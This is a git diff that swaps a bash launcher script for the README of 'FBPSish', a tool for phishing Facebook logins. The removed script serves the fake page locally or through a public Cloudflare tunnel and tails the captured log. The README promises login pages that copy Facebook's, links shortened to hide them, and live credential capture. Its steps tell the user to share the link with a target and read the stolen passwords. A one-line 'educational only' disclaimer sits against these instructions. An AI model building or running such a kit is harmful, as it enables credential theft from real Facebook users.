@@ -1,90 +1,90 @@
-#!/bin/bash
+# 🔥 FBPSish - Advanced Facebook Phishing Tool 🔥
 
-# Custom Theme
-BOLD="\033[1m"
-CYAN="\033[1;36m"
-PURPLE="\033[1;35m"
-GREEN="\033[1;32m"
-RED="\033[1;31m"
-CRESET="\033[0m"
+![GitHub Stars](https://img.shields.io/github/stars/Sabirtanvir12/fbpsish?style=for-the-badge)
+![GitHub Forks](https://img.shields.io/github/forks/Sabirtanvir12/fbpsish?style=for-the-badge)
+![GitHub Issues](https://img.shields.io/github/issues/Sabirtanvir12/fbpsish?style=for-the-badge)
+![GitHub License](https://img.shields.io/github/license/Sabirtanvir12/fbpsish?style=for-the-badge)
 
-# Animated Banner
-clear
-echo -e "${PURPLE}"
-cat << "EOF"
- ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
-█  ▄    █  █ █  █  ▄    █  ▄    █
-█ █▄█   █  █▄█  █ █▄█   █ █▄█   █
-█       █       ██      ██      ██
-█  ▄   ██▄     ▄█  ▄   ██  ▄   █ 
-█ █▄█   █ █   █ █ █▄█   █ █▄█   █
-█▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█
-EOF
-echo -e "${CRESET}"
+## 🚀 About FBPSish  
+FBPSish is an **advanced Facebook phishing tool** designed for **educational and penetration testing purposes**. It allows security researchers and ethical hackers to create **realistic phishing pages** and capture credentials **for security awareness testing**.  
 
-# Typewriter Effect
-typewriter() {
-    local text="$1"
-    for ((i=0; i<${#text}; i++)); do
-        echo -n "${text:$i:1}"
-        sleep 0.03
-    done
-    echo
-}
+⚠️ **This tool is for educational purposes only! Unauthorized use is illegal.**
 
-# Main Menu
-echo -e "${CYAN}"
-typewriter "[+] Select Attack Vector:"
-echo -e "${PURPLE}"
-typewriter "1. Localhost Server"
-typewriter "2. Cloudflare Tunnel"
-typewriter "3. Exit"
-echo -e "${CRESET}"
+---
 
-# User Input
-read -p "$(echo -e "${GREEN}>>> Enter Option [1-3]: ${CRESET}")" choice
+## 🎯 Features  
+✅ **Realistic Facebook Phishing Pages** - Mimics original UI for testing.  
+✅ **Live Credential Capture** - Logs credentials in real-time.  
+✅ **Automatic Link Generation** - Shortens phishing URLs for better disguise.  
+✅ **Portable & Lightweight** - Works on Linux, Windows, and Android (Termux).  
+✅ **Easy-to-Use Interface** - Simple command-line based execution.  
 
-# Handle Choice
-case $choice in
-    1)
-        echo -e "\n${CYAN}[~] Starting Local Server...${CRESET}"
-        read -p "$(echo -e "${GREEN}>>> Enter Port (default: 8080): ${CRESET}")" port
-        port=${port:-8080}
-        
-        # Progress Animation
-        echo -ne "${PURPLE}"
-        echo -n "Initializing"
-        for i in {1..5}; do
-            echo -n "."
-            sleep 0.3
-        done
-        echo -e "${CRESET}"
-        
-        php -S 127.0.0.1:$port > /dev/null 2>&1 &
-        echo -e "\n${GREEN}[✔] Server Running: http://127.0.0.1:$port ${CRESET}"
-        ;;
-    2)
-        echo -e "\n${CYAN}[~] Launching Cloudflare Tunnel...${CRESET}"
-        echo -ne "${PURPLE}Establishing Connection"
-        for i in {1..3}; do
-            echo -n "."
-            sleep 0.5
-        done
-        echo -e "${CRESET}"
-        
-        cloudflared tunnel --url http://localhost:8080 | grep -o 'https://[^ ]*' | head -1
-        ;;
-    3)
-        echo -e "\n${RED}[!] Exiting...${CRESET}"
-        exit 0
-        ;;
-    *)
-        echo -e "${RED}[X] Invalid Option!${CRESET}"
-        exit 1
-        ;;
-esac
+---
 
-# Session Monitor
-echo -e "\n${CYAN}[~] Active Session Monitoring Started..."
-echo -e "${GREEN}[!] Press Ctrl+C to Stop${CRESET}"
-tail -f log.txt
+## 🛠️ Installation & Usage  
+
+### **📌 Install & Setup**  
+```bash
+# Clone the repository
+git clone https://github.com/Sabirtanvir12/fbpsish.git
+
+# Navigate to the directory
+cd phish
+```
+
+---
+
+### **📌 Setup the Environment**  
+```bash
+bash setup.sh
+```
+
+---
+
+### **📌 Running the Tool**  
+```bash
+bash run.sh
+```
+
+---
+
+## 📡 Useful Commands  
+```bash
+# Start the phishing attack
+python3 fbpsish.py --start
+
+# Stop the phishing server
+python3 fbpsish.py --stop
+
+# Generate a custom phishing link
+python3 fbpsish.py --generate-link
+
+# View captured credentials
+cat logs/credentials.txt
+
+# Update the tool
+python3 fbpsish.py --update
+
+# Show help menu
+python3 fbpsish.py --help
+```
+
+---
+
+## 📡 Example Usage  
+1️⃣ Select the phishing template.  
+2️⃣ Generate a phishing link.  
+3️⃣ Share the link with the target.  
+4️⃣ Capture login credentials in real-time.  
+
+---
+
+## ⚠️ Legal Disclaimer  
+This tool is intended for **educational purposes only**. Unauthorized use of this tool on real accounts **is illegal** and punishable under cybersecurity laws. The developer is **not responsible** for any misuse.  
+
+---
+
+## 🌎 Connect With Me  
+🔗 **GitHub:** [Sabirtanvir12](https://github.com/Sabirtanvir12)  
+🔗 **LinkedIn:** [linkedin.com/in/Sabirtanvir12](https://linkedin.com/)  
+💬 **"Stay ethical, stay secure!"**  
